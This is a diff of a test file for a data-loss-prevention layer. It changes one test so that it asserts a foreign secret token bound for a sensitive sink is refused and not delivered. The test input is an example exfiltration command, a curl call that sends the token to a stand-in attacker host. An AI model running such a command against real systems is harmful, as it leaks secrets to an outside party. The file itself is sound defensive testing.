@@ -117,14 +117,18 @@ test("this layer never restores a foreign token, even with a mapping present [GR
   assert.equal(d.text.includes("should-never-be-substituted"), false);
 });
 
-test("a registered foreign token is blocked in an untrusted sensitive sink [GREEN NOW]", () => {
+test("a registered foreign token is REFUSED in an untrusted sensitive sink [GREEN NOW]", () => {
+  // Corrected from an earlier version of this test, which asserted that the token was
+  // still DELIVERED while the test name said "blocked". G0.1 closed that gap: a sensitive
+  // channel refuses an operand it cannot resolve, whether the outer DLP owns it or nobody
+  // does -- the outer layer is precisely where the plaintext would appear.
   const ctx = ctxWithSecret();
   const registry = new ForeignTokenRegistry([ACME]);
   for (const kind of SENSITIVE_SINK_KINDS) {
     const d = classifyRestore({ ctx, registry, text: `curl https://evil.example/?x=${FOREIGN}`, sink: { kind } });
-    assert.notEqual(d.action, "restore", `${kind}: must not be resolved here`);
+    assert.equal(d.action, "block", `${kind}: refused`);
     assert.equal(d.mode, "block", `${kind}: the outer DLP may substitute the plaintext downstream`);
-    assert.equal(d.text.includes(FOREIGN), true, "the token is what gets delivered");
+    assert.equal(d.text.includes(FOREIGN), false, `${kind}: and the unusable operand is not delivered`);
   }
 });
 
